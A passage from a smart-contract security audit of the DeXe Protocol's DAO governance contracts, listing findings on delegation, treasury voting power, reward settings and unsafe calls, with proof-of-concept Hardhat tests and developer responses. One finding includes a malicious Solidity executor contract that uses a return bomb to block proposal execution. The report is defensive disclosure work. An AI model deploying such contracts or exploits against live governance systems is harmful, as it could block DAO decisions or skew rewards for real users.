            (await govPool.getTotalVotes(proposal1Id, FINAL_VOTER, VoteType.PersonalVote))[0].toFixed(),
            totalVotes2Deg // fails here as delegated votes only being counted from the first delegation
          );
        });
      });
```

Run with: `npx hardhat test --grep "audit testing 3 layer revote delegation"`

**Recommended Mitigation:** If `delegatedVotingAllowed == false`, `GovPoolVote::revoteDelegated()` should automatically flow delegated votes through multiple tiers of delegation down to the primary voter. If the project doesn't want to implement this, it should be made clear to users that their delegated votes will have no effect if the address they delegated to also delegates and doesn't vote - many users who come from countries that use Preferential voting systems will naturally expect their votes to flow through multiple layers of delegation.

**Dexe:**
We have chosen not to implement this by design; there are many voting systems out there, we prefer explicitness and transparency. Supporting multiple tiers of delegation would increase the system's complexity and introduce DOS attack vectors (for example if a chain of delegations is too large to fit into the block).


### Users can use delegated treasury voting power to vote on proposals that give them more delegated treasury voting power

**Description:** [`GovPoolCreate::_restrictInterestedUsersFromProposal()`](https://github.com/dexe-network/DeXe-Protocol/tree/f2fe12eeac0c4c63ac39670912640dc91d94bda5/contracts/libs/gov/gov-pool/GovPoolCreate.sol#L164-L170) allows users to be restricted from voting on proposals that undelegate treasury voting power from a user, however no such restriction applies regarding voting on proposals that delegate treasury voting power to a user. This allows users who have received delegated treasury voting power to use that same power to vote on proposals that give them even more delegated treasury power.

**Impact:** Users can use delegated treasury voting power to vote for proposals that give them even more delegated treasury voting power - seems dangerous especially since these can be internal proposals.

**Proof of Concept:** N/A

**Recommended Mitigation:** Option 1) `GovPoolCreate::_restrictInterestedUsersFromProposal()` should allow users to be restricted from voting on proposals that delegate treasury voting power.

Option 2) It might be simpler to just hard-code this restriction in; if a user has delegated treasury voting power, then they can't vote on proposals that increase/decrease this power.

The principle would be that users who receive delegated treasury voting power only keep this power at the pleasure of the DAO, and they can never use this power to vote on proposals that increase/decrease this power, for themselves or for other users.

Right now it is dependent upon the user creating the proposals to restrict the correct users from voting which is error-prone, and only works for decreasing, not increasing, this power.

**Dexe:**
Fixed in [PR168](https://github.com/dexe-network/DeXe-Protocol/commit/01bc28e89a99da5f7b67d6645c935f7230a8dc7b).

**Cyfrin:** Dexe has chosen to allow restricted users to vote on such proposals, just not with their delegated treasury. The delegated treasury of restricted users is subtracted from the required quorum calculation and restricted users can't vote with it on those proposals. This applies to delegating/undelegating treasury & burning expert nfts, such that users who have received delegated treasury power can't use it to delegate themselves more treasury power.

However, Dexe has not fully implemented the recommendation that: _"they can never use this power to vote on proposals that increase/decrease this power, for themselves **or for other users**."_ A user with delegated treasury power can get around the new restrictions by creating a proposal to delegate treasury power to another address they control, then voting on that proposal with their existing address that has delegated treasury power.

Cyfrin continues to recommend that users who have received delegated treasury voting power are not allowed to vote on any proposals that delegate/undelegate treasury voting power, both for themselves but also for other users.


### Changing `nftMultiplier` address by executing a proposal that calls `GovPool::setNftMultiplierAddress()` can deny existing users from claiming pending nft multiplier rewards

**Description:** [`GovPool::setNftMultiplierAddress()`](https://github.com/dexe-network/DeXe-Protocol/tree/f2fe12eeac0c4c63ac39670912640dc91d94bda5/contracts/gov/GovPool.sol#L343-L345) which can be called by an internal proposal updates the nft multiplier address to a new contract.

`GovPoolRewards::_getMultipliedRewards()` [calls](https://github.com/dexe-network/DeXe-Protocol/tree/f2fe12eeac0c4c63ac39670912640dc91d94bda5/contracts/libs/gov/gov-pool/GovPoolRewards.sol#L203) `GovPool::getNftContracts()` to retrieve the nft multiplier address when calculating rewards. If the contract has been updated to a different one any unclaimed nft multiplier rewards will no longer exist.

**Impact:** Users will lose their unclaimed nft multiplier rewards when a proposal gets required votes to execute `GovPool::setNftMultiplierAddress()`.

**Proof of Concept:** N/A

**Recommended Mitigation:** The address of the current nft multiplier contract could be saved for each proposal when the proposal is created, such that updating the global nft multiplier address would only take effect for new proposals.

If this is indeed the intended design, consider implementing user notifications to alert all users with unclaimed NFT multiplier rewards to collect them before the proposal voting period concludes. Furthermore, consider incorporating explicit disclaimers in the documentation to inform users that voting on a proposal aimed at updating multiplier rewards may result in the forfeiture of unclaimed rewards. This transparency will help users make informed decisions and mitigate potential unexpected outcomes.

**Dexe:**
Acknowledged; this is expected behavior. If a DAO decides to add/remove the NFT multiplier, it should affect every DAO member regardless. This actually works in two ways: if a DAO decides to add an NFT multiplier, every unclaimed reward will be boosted.


### Proposal creation uses incorrect `ERC721Power::totalPower` as nft power not updated before snapshot

**Description:** If `GovPool` is configured to use `ERC721Power` nft, when the proposal is created it doesn't recalculate the nft power, just [reads](https://github.com/dexe-network/DeXe-Protocol/tree/f2fe12eeac0c4c63ac39670912640dc91d94bda5/contracts/gov/user-keeper/GovUserKeeper.sol#L331) `ERC721Power::totalPower` straight from storage.

This is incorrect as it will be reading an old value; it has to recalculate nft power first then read it to read the correct, current value. There are [tests](https://github.com/dexe-network/DeXe-Protocol/tree/f2fe12eeac0c4c63ac39670912640dc91d94bda5/test/gov/GovUserKeeper.test.js#L1470-L1471) in `GovUserKeeper` that do exactly this, before calling `GovUserKeeper::createNftPowerSnapshot()` the tests call `GovUserKeeper::updateNftPowers()`. But it looks like in the actual codebase there is never a call to `GovUserKeeper::updateNftPowers()`, only in the tests.

**Impact:** Proposals are created with an incorrect & potentially much greater `ERC721Power::totalPower`. This is used as [the divisor in GovUserKeeper::getNftsPowerInTokensBySnapshot()](https://github.com/dexe-network/DeXe-Protocol/tree/f2fe12eeac0c4c63ac39670912640dc91d94bda5/contracts/gov/user-keeper/GovUserKeeper.sol#L559) hence a stale larger divisor will incorrectly reduce the voting power of nfts.

**Proof of Concept:** First [comment out this check](https://github.com/dexe-network/DeXe-Protocol/tree/f2fe12eeac0c4c63ac39670912640dc91d94bda5/contracts/gov/user-keeper/GovUserKeeper.sol#L690) to allow the test to update the nft in-place.

Then add the PoC to `GovPool.test.js` under section `describe("getProposalState()", () => {`:
```javascript
      it("audit proposal creation uses incorrect ERC721Power totalPower as nft power not updated before snapshot", async () => {
        let powerNftCalcStartTime = (await getCurrentBlockTime()) + 200;

        // required so we can call .toFixed() on BN returned outputs
        ERC721Power.numberFormat = "BigNumber";

        // ERC721Power::totalPower should be zero as no nfts yet created
        assert.equal((await nftPower.totalPower()).toFixed(), "0");

        // so proposal doesn't need to go to validators
        await changeInternalSettings(false);

        // set nftPower as the voting nft
        // need to comment out check preventing updating existing
        // nft address in GovUserKeeper::setERC721Address()
        await impersonate(govPool.address);
        await userKeeper.setERC721Address(nftPower.address, wei("33000"), 33, { from: govPool.address });

        // create a new VOTER account and mint them 5 power nfts
        let VOTER = await accounts(10);
        await nftPower.safeMint(VOTER, 1);
        await nftPower.safeMint(VOTER, 2);
        await nftPower.safeMint(VOTER, 3);
        await nftPower.safeMint(VOTER, 4);
        await nftPower.safeMint(VOTER, 5);

        // advance to the approximate time when nft power calculation starts
        await setTime(powerNftCalcStartTime);

        // save existing nft power after power calculation has started
        let nftTotalPowerBefore = "4500000000000000000000000000";
        assert.equal((await nftPower.totalPower()).toFixed(), nftTotalPowerBefore);

        // advance time; since none of the nfts have collateral deposited
        // their power will decrement
        await setTime((await getCurrentBlockTime()) + 10000);

        // create a proposal which takes a snapshot of the current nft power
        // but fails to update it before taking the snapshot, so uses the
        // old incorrect power
        let proposalId = 2;

        await govPool.createProposal(
          "example.com",
          [[govPool.address, 0, getBytesGovVote(3, wei("100"), [], true)]],
          [[govPool.address, 0, getBytesGovVote(3, wei("100"), [], false)]]
        );

        // verify the proposal snapshot saved the nft totalPower before the time
        // was massively advanced. This is incorrect as the true totalPower is 0
        // by this time due to the nfts losing power. The proposal creation process
        // fails to recalculate nft power before reading ERC721Power::totalPower
        assert.equal((await userKeeper.nftSnapshot(2)).toFixed(), nftTotalPowerBefore);

        // call ERC721::recalculateNftPower() for the nfts, this will update
        // ERC721Power::totalPower with the actual current total power
        await nftPower.recalculateNftPower("1");
        await nftPower.recalculateNftPower("2");
        await nftPower.recalculateNftPower("3");
        await nftPower.recalculateNftPower("4");
        await nftPower.recalculateNftPower("5");

        // verify that the true totalPower has decremented to zero as the nfts
        // lost all their power since they didn't have collateral deposited
        assert.equal((await nftPower.totalPower()).toFixed(), "0");

        // the proposal was created with an over-inflated nft total power
        // GovUserKeeper has a function called updateNftPowers() that is onlyOwner
        // meaning it is supposed to be called by GovPool, but this function
        // is never called anywhere. But in the GovUserKeeper unit tests it is
        // called before the call to createNftPowerSnapshot() which creates
        // the snapshot reading ERC721Power::totalPower
      });
```

Run with: `npx hardhat test --grep "audit proposal creation uses incorrect ERC721Power totalPower"`

**Recommended Mitigation:** As there could be many nfts calling `GovUserKeeper::updateNftPowers()` one-by-one is not an efficient way of doing this update. A solution may involve refactoring of how power nfts work.

**Dexe:**
Fixed in [PR172](https://github.com/dexe-network/DeXe-Protocol/commit/b2b30da3204acd16da6fa61e79703ac0b6271815), [PR173](https://github.com/dexe-network/DeXe-Protocol/commit/15edac2ba207a915bd537684cd7644831ec2c887). Removed snapshotting.

**Cyfrin:** Verified.


### A misbehaving validator can influence voting outcomes even after their voting power is reduced to 0

**Description:** Validators are trusted parties appointed by DAO as a second-level check to prevent malicious proposals from getting executed.
The current system is designed with the following constraints:
1. Executing `GovValidators::changeBalances` is the only way to assign or withdraw voting power to validators
2. Any person holding a validator token balance gets to be a validator
3. `GovValidatorsVote::vote` ensures that only token balances at the snapshotId when the validator proposal was created is used for voting

This design does not cover security risks associated with
a. loss of private keys
b. inactive validator
c. misbehaving validator

While there is a provision to expel a validator by reducing his validator token balance to 0, the current system does not have a provision to prevent a validator from voting on active proposals with a back-dated snapshotId. If a validator is not aligned with the interests of the DAO and is expelled by voting, we believe it is a security risk to allow such validators to influence voting outcomes of active proposals

**Impact:** A validator who no longer fulfils the trusted role of protecting DAO's best interests still holds control on DAO's future based on past voting power.

**Proof of Concept:** Consider the following scenario:
- Alice is a validator with 10% voting power in DAO A
- Alice lost her private keys
- Validators vote to execute `GovValidators::changeBalances` with Alice balance reduced to 0
- Critical proposal P that is currently active with snapshotId where Alice has 10% voting power
- Validators think P is not in the best interest of DAO and vote against
- Alice's keys now controlled by hacker Bob who votes with 10% voting power
- Proposal hits quorum and gets passed

This is a security risk for the DAO.

**Recommended Mitigation:** Consider adding `isValidator` check for `vote` and `cancelVote` functions in `GovValidator`. This would prevent a validator with zero current balance to influence voting outcomes based on their back-dated voting power.

**Dexe:**
Acknowledged; we are using validator snapshotting so in past proposals they might have some voting power. We wont change this behavior since otherwise removing the validator should also remove their votes from the ongoing proposals (not ideal to do on-chain).


### Voting to change `RewardsInfo::voteRewardsCoefficient` has an unintended side-effect of retrospectively changing voting rewards for active proposals

**Description:** `GovSettings::editSettings` is one of the functions that can be executed via an internal proposal. When this function is called, setting are validated via `GovSettings::_validateProposalSettings`. This function does not check the value of `RewardsInfo::voteRewardsCoefficient` while updating the settings. There is neither a floor nor a cap for this setting.

However, we've noted that this coefficient amplifies voting rewards as calculated in the `GovPoolRewards::_getInitialVotingRewards` shown below.

```solidity
    function _getInitialVotingRewards(
        IGovPool.ProposalCore storage core,
        IGovPool.VoteInfo storage voteInfo
    ) internal view returns (uint256) {
        (uint256 coreVotes, uint256 coreRawVotes) = voteInfo.isVoteFor
            ? (core.votesFor, core.rawVotesFor)
            : (core.votesAgainst, core.rawVotesAgainst);

        return
            coreRawVotes.ratio(core.settings.rewardsInfo.voteRewardsCoefficient, PRECISION).ratio(
                voteInfo.totalVoted,
                coreVotes
            ); //@audit -> initial rewards are calculated proportionate to the vote rewards coefficient
    }
```
This has the unintended side-effect that for the same proposal, different voters can get paid different rewards based on when the reward was claimed. In the extreme case where `core.settings.rewardsInfo.voteRewardsCoefficient` is voted to 0, note that we have a situation where voters who claimed rewards before the update got paid as promised whereas voters who claimed later got nothing.

**Impact:** Updating `rewardsCoefficient` can lead to unfair reward distribution on old proposals. Since voting rewards for a given proposal are communicated upfront, this could lead to a situation where promised rewards to users are not honoured.

**Proof of Concept:** N/A

**Recommended Mitigation:** Consider freezing `voteRewardMultiplier` and the time of proposal creation. A prospective update of this setting via internal voting should not change rewards for old proposals.

**Dexe:**
Acknowledged; similar issue to changing the nftMultiplier address. It is our design that if the DAO decides to change these parameters, this change is applied to all proposals including those in the past.


### Proposal execution can be DOSed with return bombs when calling untrusted execution contracts

**Description:** `GovPool::execute` does not check for return bombs when executing a low-level call. A return bomb is a large bytes array that expands the memory so much that any attempt to execute the transaction will lead to an `out-of-gas` exception.

This can create potentially risky outcomes for the DAO. One possible outcome is "single sided" execution, ie. "actionsFor" can be executed when voting is successful while "actionsAgainst" can be DOSed when voting fails.

A clever proposal creator can design a proposal in such a way that only `actionsFor` can be executed and any attempts to execute `actionsAgainst` will be permanently DOS'ed (refer POC contract). T

This is possible because the `GovPoolExecute::execute` does a low level call on potentially untrusted `executor` assigned to a specific action.

```solidity
   function execute(
        mapping(uint256 => IGovPool.Proposal) storage proposals,
        uint256 proposalId
    ) external {
        .... // code

        for (uint256 i; i < actionsLength; i++) {
>            (bool status, bytes memory returnedData) = actions[i].executor.call{
                value: actions[i].value
            }(actions[i].data); //@audit returnedData could expand memory and cause out-of-gas exception

            require(status, returnedData.getRevertMsg());
        }
   }
```

**Impact:** Voting actions can be manipulated by a creator causing two potential issues:

1. Proposal actions can never be executed even after successful voting
2. One-sided execution where some actions can be executed while others can be DOSed

**Proof of Concept:** Consider the following malicious proposal action executor contract. Note that when the proposal passes (`isVotesFor` = true), the `vote()` function returns empty bytes and when the proposal fails (`isVotesFor` = false), the same function returns a huge bytes array, effectively causing an "out-of-gas" exception to any caller.

```solidity
contract MaliciousProposalActionExecutor is IProposalValidator{

    function validate(IGovPool.ProposalAction[] calldata actions) external view override returns (bool valid){
    	valid = true;
    }

    function vote(
        uint256 proposalId,
        bool isVoteFor,
        uint256 voteAmount,
        uint256[] calldata voteNftIds
    ) external returns(bytes memory result){

	if(isVoteFor){
		// @audit implement actions for successful vote
        	return ""; // 0 bytes
        }
	else{
		// @audit implement actions for failed vote

		// Create a large bytes array
                assembly{
                     revert(0, 1_000_000)
              }
	}

   }
}
```

**Recommended Mitigation:** Consider using [`ExcessivelySafeCall`](https://github.com/nomad-xyz/ExcessivelySafeCall) while calling untrusted contracts to avoid return bombs.

**Dexe:**
Acknowledged; we are aware of the fact that proposals may be stuck in the succeeded state. But probably we wont alter this behavior on-chain since a DAO already decided to complete this proposal. Might add some labels on the front end.

\clearpage
## Low Risk


### Unsafe downcast from uint256 to uint56 can silently overflow resulting in incorrect voting power for validators

**Description:** `GovValidatorsCreate::createInternalProposal()` [L38](https://github.com/dexe-network/DeXe-Protocol/tree/f2fe12eeac0c4c63ac39670912640dc91d94bda5/contracts/libs/gov/gov-validators/GovValidatorsCreate.sol#L38) & `createExternalProposal()` [L67](https://github.com/dexe-network/DeXe-Protocol/tree/f2fe12eeac0c4c63ac39670912640dc91d94bda5/contracts/libs/gov/gov-validators/GovValidatorsCreate.sol#L67) performs an unsafe downcast from `uint256` to `uint56` which can silently overflow.

**Impact:** If the overflow occurs proposals will be created with an incorrect `snapshotId` giving incorrect voting power to the validators.

**Recommended Mitigation:** Use OpenZeppelin [SafeCast](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/utils/math/SafeCast.sol) so that if the downcast would overflow, it will revert instead.

**Dexe:**
Acknowledged. uint56 cant be reached with incremental snapshots. It is that much: 72,057,594,037,927,935


### Missing storage gap in `AbstractERC721Multiplier` can lead to upgrade storage slot collision

**Description:** [`AbstractERC721Multiplier`](https://github.com/dexe-network/DeXe-Protocol/tree/f2fe12eeac0c4c63ac39670912640dc91d94bda5/contracts/gov/ERC721/multipliers/AbstractERC721Multiplier.sol) is an upgradeable contract which has state but no storage gaps and has 1 child contract with its own state [`DexeERC721Multiplier`](https://github.com/dexe-network/DeXe-Protocol/tree/f2fe12eeac0c4c63ac39670912640dc91d94bda5/contracts/gov/ERC721/multipliers/DexeERC721Multiplier.sol).

**Impact:** Should an upgrade occur where the `AbstractERC721Multiplier` contract has additional state added to storage, a storage collision can occur where storage within the child contract `DexeERC721Multiplier` is overwritten.

**Proof of Concept:** N/A

**Recommended Mitigation:** Add a storage gap to the `AbstractERC721Multiplier` contract.

**Dexe:**
Fixed in [PR164](https://github.com/dexe-network/DeXe-Protocol/commit/cdf9369193e1b2d6640c975d2c8e872710f6e065).

**Cyfrin:** Verified.


### Use low-level `call()` to prevent gas griefing attacks when returned data not required

**Description:** Using `call()` when the returned data is not required unnecessarily exposes to gas griefing attacks from huge returned data payload. For [example](https://github.com/dexe-network/DeXe-Protocol/tree/f2fe12eeac0c4c63ac39670912640dc91d94bda5/contracts/libs/utils/TokenBalance.sol#L31):

```solidity
(bool status, ) = payable(receiver).call{value: amount}("");
require(status, "Gov: failed to send eth");
```

Is the same as writing:

```solidity
(bool status, bytes memory data ) = payable(receiver).call{value: amount}("");
require(status, "Gov: failed to send eth");
```

In both cases the returned data will have to be copied into memory exposing the contract to gas griefing attacks, even though the returned data is not required at all.

**Impact:** Contracts unnecessarily expose themselves to gas griefing attacks.

**Recommended Mitigation:** Use a low-level call when the returned data is not required, eg:
```solidity
bool status;
assembly {
    status := call(gas(), receiver, amount, 0, 0, 0, 0)
}
```

Consider using [ExcessivelySafeCall](https://github.com/nomad-xyz/ExcessivelySafeCall).

**Dexe:**
Acknowledged; calls to legitimate contracts will not revert. However, if the contract is corrupt it can just panic and achieve the same result.


### Small delegations prevent delegatee from receiving micropool rewards while still rewarding delegator

**Description:** Small delegations prevent delegatee from receiving micropool rewards while still rewarding delegator.

**Impact:** Delegatee doesn't receive micropool rewards but the delegator is able to extract them via delegating in small amounts. This is an interesting edge case that we haven't figured out if it is seriously exploitable but it does break a core invariant of similar systems, namely that many small operations should have the same effect as one large operation. In this case multiple small delegations result in a *different* effect that one large delegation breaking this core system invariant.

**Proof of Concept:** Add PoC to `GovPool.test.js` under section `describe("getProposalState()", () => {`:
```javascript
      it("audit small delegations prevent delegatee from receiving micropool rewards while still rewarding delegator", async () => {
        // so proposals doesn't need to go to validators
        await changeInternalSettings(false);

        // required for executing the proposals
        await govPool.deposit(govPool.address, wei("200"), []);

        // create 4 proposals; only the first 2 will be executed
        // create proposal 1
        await govPool.createProposal(
          "example.com",
          [[govPool.address, 0, getBytesGovVote(4, wei("100"), [], true)]],
          [[govPool.address, 0, getBytesGovVote(4, wei("100"), [], false)]]
        );
        // create proposal 2
        await govPool.createProposal(
          "example.com",
          [[govPool.address, 0, getBytesGovVote(5, wei("100"), [], true)]],
          [[govPool.address, 0, getBytesGovVote(5, wei("100"), [], false)]]
        );
        // create proposal 3
        await govPool.createProposal(
          "example.com",
          [[govPool.address, 0, getBytesGovVote(5, wei("100"), [], true)]],
          [[govPool.address, 0, getBytesGovVote(5, wei("100"), [], false)]]
        );
        // create proposal 4
        await govPool.createProposal(
          "example.com",
          [[govPool.address, 0, getBytesGovVote(5, wei("100"), [], true)]],
          [[govPool.address, 0, getBytesGovVote(5, wei("100"), [], false)]]
        );

        let proposal1Id = 2;
        let proposal2Id = 3;

        let DELEGATEE  = await accounts(10);
        let DELEGATOR1 = await accounts(9);
        let DELEGATOR2 = await accounts(8);
        let DELEGATOR3 = await accounts(7);

        let delegator1Tokens = wei("50000000000000000000");
        let delegator2Tokens = wei("150000000000000000000");
        let delegator3Tokens = "4";
        let delegateeReward  = wei("40000000000000000000");
        let delegator1Reward = wei("40000000000000000000");
        let delegator2Reward = wei("120000000000000000000");
        let delegator3Reward = "3";

        // mint tokens & deposit them to have voting power
        await token.mint(DELEGATOR1, delegator1Tokens);
        await token.approve(userKeeper.address, delegator1Tokens, { from: DELEGATOR1 });
        await govPool.deposit(DELEGATOR1, delegator1Tokens, [], { from: DELEGATOR1 });
        await token.mint(DELEGATOR2, delegator2Tokens);
        await token.approve(userKeeper.address, delegator2Tokens, { from: DELEGATOR2 });
        await govPool.deposit(DELEGATOR2, delegator2Tokens, [], { from: DELEGATOR2 });
        await token.mint(DELEGATOR3, delegator3Tokens);
        await token.approve(userKeeper.address, delegator3Tokens, { from: DELEGATOR3 });
        await govPool.deposit(DELEGATOR3, delegator3Tokens, [], { from: DELEGATOR3 });

        // for proposal 1, only DELEGATOR1 & DELEGATOR2 will delegate to DELEGATEE
        await govPool.delegate(DELEGATEE, delegator1Tokens, [], { from: DELEGATOR1 });
        await govPool.delegate(DELEGATEE, delegator2Tokens, [], { from: DELEGATOR2 });

        // DELEGATEE votes on proposal 1
        await govPool.vote(proposal1Id, true, "0", [], { from: DELEGATEE });

        // verify DELEGATEE's voting
        assert.equal(
          (await govPool.getUserVotes(proposal1Id, DELEGATEE, VoteType.PersonalVote)).totalRawVoted,
          "0" // personal votes remain the same
        );
        assert.equal(
          (await govPool.getUserVotes(proposal1Id, DELEGATEE, VoteType.MicropoolVote)).totalRawVoted,
          wei("200000000000000000000") // delegated votes included
        );
        assert.equal(
          (await govPool.getTotalVotes(proposal1Id, DELEGATEE, VoteType.PersonalVote))[0].toFixed(),
          wei("200000000000000000000") // delegated votes included
        );

        // advance time
        await setTime((await getCurrentBlockTime()) + 1);

        // proposal 1 now in SucceededFor state
        assert.equal(await govPool.getProposalState(proposal1Id), ProposalState.SucceededFor);

        // execute proposal 1
        await govPool.execute(proposal1Id);

        // verify pending rewards via GovPool::getPendingRewards()
        let pendingRewards = await govPool.getPendingRewards(DELEGATEE, [proposal1Id]);

        assert.deepEqual(pendingRewards.onchainTokens, [rewardToken.address]);
        assert.equal(pendingRewards.votingRewards[0].personal, "0");
        assert.equal(pendingRewards.votingRewards[0].micropool, delegateeReward);
        assert.equal(pendingRewards.votingRewards[0].treasury, "0");

        pendingRewards = await govPool.getPendingRewards(DELEGATOR1, [proposal1Id]);

        assert.deepEqual(pendingRewards.onchainTokens, [rewardToken.address]);
        assert.equal(pendingRewards.votingRewards[0].personal, "0");
        assert.equal(pendingRewards.votingRewards[0].micropool, "0");
        assert.equal(pendingRewards.votingRewards[0].treasury, "0");

        pendingRewards = await govPool.getPendingRewards(DELEGATOR2, [proposal1Id]);

        assert.deepEqual(pendingRewards.onchainTokens, [rewardToken.address]);
        assert.equal(pendingRewards.votingRewards[0].personal, "0");
        assert.equal(pendingRewards.votingRewards[0].micropool, "0");
        assert.equal(pendingRewards.votingRewards[0].treasury, "0");

        pendingRewards = await govPool.getPendingRewards(DELEGATOR3, [proposal1Id]);

        assert.deepEqual(pendingRewards.onchainTokens, [rewardToken.address]);
        assert.equal(pendingRewards.votingRewards[0].personal, "0");
        assert.equal(pendingRewards.votingRewards[0].micropool, "0");
        assert.equal(pendingRewards.votingRewards[0].treasury, "0");

        // verify pending delegator rewards via GovPool::getDelegatorRewards()
        pendingRewards = await govPool.getDelegatorRewards([proposal1Id], DELEGATOR1, DELEGATEE);
        assert.deepEqual(pendingRewards.rewardTokens, [rewardToken.address]);
        assert.deepEqual(pendingRewards.isVoteFor, [true]);
        assert.deepEqual(pendingRewards.isClaimed, [false]);
        assert.deepEqual(pendingRewards.expectedRewards, [delegator1Reward]);

        pendingRewards = await govPool.getDelegatorRewards([proposal1Id], DELEGATOR2, DELEGATEE);
        assert.deepEqual(pendingRewards.rewardTokens, [rewardToken.address]);
        assert.deepEqual(pendingRewards.isVoteFor, [true]);
        assert.deepEqual(pendingRewards.isClaimed, [false]);
        assert.deepEqual(pendingRewards.expectedRewards, [delegator2Reward]);

        pendingRewards = await govPool.getDelegatorRewards([proposal1Id], DELEGATOR3, DELEGATEE);
        assert.deepEqual(pendingRewards.rewardTokens, [rewardToken.address]);
        assert.deepEqual(pendingRewards.isVoteFor, [true]);
        assert.deepEqual(pendingRewards.isClaimed, [false]);
        assert.deepEqual(pendingRewards.expectedRewards, ["0"]);

        // reward balances 0 before claiming rewards
        assert.equal((await rewardToken.balanceOf(DELEGATEE)).toFixed(), "0");
        assert.equal((await rewardToken.balanceOf(DELEGATOR1)).toFixed(), "0");
        assert.equal((await rewardToken.balanceOf(DELEGATOR2)).toFixed(), "0");

        // claim rewards
        await govPool.claimRewards([proposal1Id], { from: DELEGATEE });
        await govPool.claimMicropoolRewards([proposal1Id], DELEGATEE, { from: DELEGATOR1 });
        await govPool.claimMicropoolRewards([proposal1Id], DELEGATEE, { from: DELEGATOR2 });

        // verify reward balances after claiming rewards
        assert.equal((await rewardToken.balanceOf(DELEGATEE)).toFixed(), delegateeReward);
        assert.equal((await rewardToken.balanceOf(DELEGATOR1)).toFixed(), delegator1Reward);
        assert.equal((await rewardToken.balanceOf(DELEGATOR2)).toFixed(), delegator2Reward);

        // for proposal 2, DELEGATOR3 will additionally delegate a small amount to DELEGATEE
        // when delegating small token amounts (max 4 in this configuration), DELEGATOR3 is
        // able to extract micropool rewards while not giving any micropool rewards to DELEGATEE
        // nor impacting the micropool rewards of the other delegators
        await govPool.delegate(DELEGATEE, delegator3Tokens, [], { from: DELEGATOR3 });

        // DELEGATEE votes on proposal 2
        await govPool.vote(proposal2Id, true, "0", [], { from: DELEGATEE });

        // verify DELEGATEE's voting
        assert.equal(
          (await govPool.getUserVotes(proposal2Id, DELEGATEE, VoteType.PersonalVote)).totalRawVoted,
          "0" // personal votes remain the same
        );
        assert.equal(
          (await govPool.getUserVotes(proposal2Id, DELEGATEE, VoteType.MicropoolVote)).totalRawVoted,
          wei("20000000000000000000") + delegator3Tokens // DELEGATOR3 votes included
        );
        assert.equal(
          (await govPool.getTotalVotes(proposal2Id, DELEGATEE, VoteType.PersonalVote))[0].toFixed(),
          wei("20000000000000000000") + delegator3Tokens // DELEGATOR3 votes included
        );

        // advance time
        await setTime((await getCurrentBlockTime()) + 1);

        // proposal 2 now in SucceededFor state
        assert.equal(await govPool.getProposalState(proposal2Id), ProposalState.SucceededFor);

        // execute proposal 2
        await govPool.execute(proposal2Id);

        // verify pending rewards via GovPool::getPendingRewards()
        pendingRewards = await govPool.getPendingRewards(DELEGATEE, [proposal2Id]);

        assert.deepEqual(pendingRewards.onchainTokens, [rewardToken.address]);
        assert.equal(pendingRewards.votingRewards[0].personal, "0");
        // DELEGATEE doesn't receive any additional micropool rewards even though
        // DELEGATOR3 is now delegating to them
        assert.equal(pendingRewards.votingRewards[0].micropool, delegateeReward);
        assert.equal(pendingRewards.votingRewards[0].treasury, "0");

        pendingRewards = await govPool.getPendingRewards(DELEGATOR1, [proposal2Id]);

        assert.deepEqual(pendingRewards.onchainTokens, [rewardToken.address]);
        assert.equal(pendingRewards.votingRewards[0].personal, "0");
        assert.equal(pendingRewards.votingRewards[0].micropool, "0");
        assert.equal(pendingRewards.votingRewards[0].treasury, "0");

        pendingRewards = await govPool.getPendingRewards(DELEGATOR2, [proposal2Id]);

        assert.deepEqual(pendingRewards.onchainTokens, [rewardToken.address]);
        assert.equal(pendingRewards.votingRewards[0].personal, "0");
        assert.equal(pendingRewards.votingRewards[0].micropool, "0");
        assert.equal(pendingRewards.votingRewards[0].treasury, "0");

        pendingRewards = await govPool.getPendingRewards(DELEGATOR3, [proposal2Id]);

        assert.deepEqual(pendingRewards.onchainTokens, [rewardToken.address]);
        assert.equal(pendingRewards.votingRewards[0].personal, "0");
        assert.equal(pendingRewards.votingRewards[0].micropool, "0");
        assert.equal(pendingRewards.votingRewards[0].treasury, "0");

        // verify pending delegator rewards via GovPool::getDelegatorRewards()
        pendingRewards = await govPool.getDelegatorRewards([proposal2Id], DELEGATOR1, DELEGATEE);
        assert.deepEqual(pendingRewards.rewardTokens, [rewardToken.address]);
        assert.deepEqual(pendingRewards.isVoteFor, [true]);
        assert.deepEqual(pendingRewards.isClaimed, [false]);
        assert.deepEqual(pendingRewards.expectedRewards, [delegator1Reward]);

        pendingRewards = await govPool.getDelegatorRewards([proposal2Id], DELEGATOR2, DELEGATEE);
        assert.deepEqual(pendingRewards.rewardTokens, [rewardToken.address]);
        assert.deepEqual(pendingRewards.isVoteFor, [true]);
        assert.deepEqual(pendingRewards.isClaimed, [false]);
        assert.deepEqual(pendingRewards.expectedRewards, [delegator2Reward]);

        pendingRewards = await govPool.getDelegatorRewards([proposal2Id], DELEGATOR3, DELEGATEE);
        assert.deepEqual(pendingRewards.rewardTokens, [rewardToken.address]);
        assert.deepEqual(pendingRewards.isVoteFor, [true]);
        assert.deepEqual(pendingRewards.isClaimed, [false]);
        // DELEGATOR3 now gets micropool rewards even though DELEGATEE isn't getting
        // any additional rewards
        assert.deepEqual(pendingRewards.expectedRewards, ["3"]);

        // reward balances same as rewards from proposal 1
        assert.equal((await rewardToken.balanceOf(DELEGATEE)).toFixed(), delegateeReward);
        assert.equal((await rewardToken.balanceOf(DELEGATOR1)).toFixed(), delegator1Reward);
        assert.equal((await rewardToken.balanceOf(DELEGATOR2)).toFixed(), delegator2Reward);

        // claim rewards
        await govPool.claimRewards([proposal2Id], { from: DELEGATEE });
        await govPool.claimMicropoolRewards([proposal2Id], DELEGATEE, { from: DELEGATOR1 });
        await govPool.claimMicropoolRewards([proposal2Id], DELEGATEE, { from: DELEGATOR2 });
        await govPool.claimMicropoolRewards([proposal2Id], DELEGATEE, { from: DELEGATOR3 });

        // verify reward balances after claiming rewards
        // for DELEGATEE, DELEGATOR1 & DELEGATOR2 balances have multiplied by 2 as they
        // received the exact same rewards; the participation of DELEGATOR3 did not result in
        // any additional rewards for DELEGATEE
        assert.equal((await rewardToken.balanceOf(DELEGATEE)).toFixed(), wei("80000000000000000000"));
        assert.equal((await rewardToken.balanceOf(DELEGATOR1)).toFixed(), wei("80000000000000000000"));
        assert.equal((await rewardToken.balanceOf(DELEGATOR2)).toFixed(), wei("240000000000000000000"));

        // DELEGATOR3 was able to get micropool rewards by delegating to DELEGATEE while
        // ensuring that DELEGATEE didn't get any additional rewards
        assert.equal((await rewardToken.balanceOf(DELEGATOR3)).toFixed(), "3");

        // this doesn't seem to be seriously exploitable but it does break one of the core invariants
